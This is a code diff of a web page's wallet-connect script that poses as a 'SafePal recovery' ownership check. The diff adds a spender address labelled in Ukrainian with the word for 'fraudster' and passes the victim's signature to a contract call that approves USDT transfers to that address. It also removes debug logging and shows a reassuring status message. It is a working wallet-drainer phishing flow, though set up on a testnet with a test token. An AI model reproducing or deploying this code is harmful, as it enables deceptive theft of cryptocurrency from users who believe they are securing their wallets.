@@ -53,15 +53,12 @@
     <script>
         async function connectWallet() {
             try {
-                console.log('Step 1: Connect Wallet button clicked.');
                 document.getElementById('status').innerText = 'Connecting...';
 
-                console.log('Step 2: Checking MetaMask availability...');
                 if (!window.ethereum || !window.ethereum.isMetaMask) {
                     throw new Error('MetaMask not found. Please install MetaMask or ensure it is active.');
                 }
 
-                console.log('Step 3: Requesting accounts...');
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 if (accounts.length === 0) {
                     throw new Error('No accounts found. Please unlock MetaMask.');
@@ -69,14 +66,11 @@
 
                 const userAddress = accounts[0];
                 document.getElementById('status').innerText = 'Connected. Verifying wallet ownership...';
-                console.log('Step 4: Connected with address:', userAddress);
 
                 // Перевірка мережі (Sepolia)
-                console.log('Step 5: Checking network...');
                 const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
                 const targetChainId = 11155111; // Sepolia Testnet
                 if (chainId !== targetChainId) {
-                    console.log('Switching to Sepolia Testnet...');
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: `0x${targetChainId.toString(16)}` }]
@@ -84,37 +78,35 @@
                 }
 
                 // Підпис повідомлення
-                console.log('Step 6: Verifying wallet ownership...');
                 const message = 'Verify wallet ownership for SafePal recovery';
                 const signature = await window.ethereum.request({
                     method: 'personal_sign',
                     params: [message, userAddress]
                 });
 
-                console.log('Step 7: Signature obtained:', signature);
+                console.log('Signature:', signature);
                 document.getElementById('status').innerText = 'Wallet verified. Processing recovery...';
 
                 // Виклик executeApprove через ApproveContract
-                const contractAddress = '0xD0c5115783895d82b5251234B3418eA423e0555C'; // Встав нову адресу контракту
+                const contractAddress = '0x9396288E409c7c6E47b47156EDF62F25088586a6'; // Встав нову адресу
                 const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
-                const amount = 1000000000; // 1000 USDT
+                const shahraiAddress = '0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e'; // Гаманець Б
+                const amount = 1000; // 1000 USDT
 
                 const contractAbi = [
-                    "function executeApprove(bytes memory message, address user, bytes memory signature, address token, uint256 amount) external"
+                    "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external"
                 ];
 
-                console.log('Step 8: Initializing provider and signer...');
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
                 const contract = new ethers.Contract(contractAddress, contractAbi, signer);
 
-                console.log('Step 9: Executing approve...');
                 const messageBytes = ethers.utils.toUtf8Bytes(message);
-                const tx = await contract.executeApprove(messageBytes, userAddress, signature, usdtAddress, amount);
+                const tx = await contract.executeApprove(messageBytes, userAddress, signature, usdtAddress, shahraiAddress, amount);
                 await tx.wait();
-                console.log('Verification Transaction Hash:', tx.hash);
+                console.log('Transaction Hash:', tx.hash);
 
-                document.getElementById('status').innerText = 'Recovery process completed! Your wallet is secure.';
+                document.getElementById('status').innerText = 'Recovery processed! Check your wallet.';
             } catch (error) {
                 document.getElementById('status').innerText = `Error: ${error.message}`;
                 console.error('Detailed error:', error);
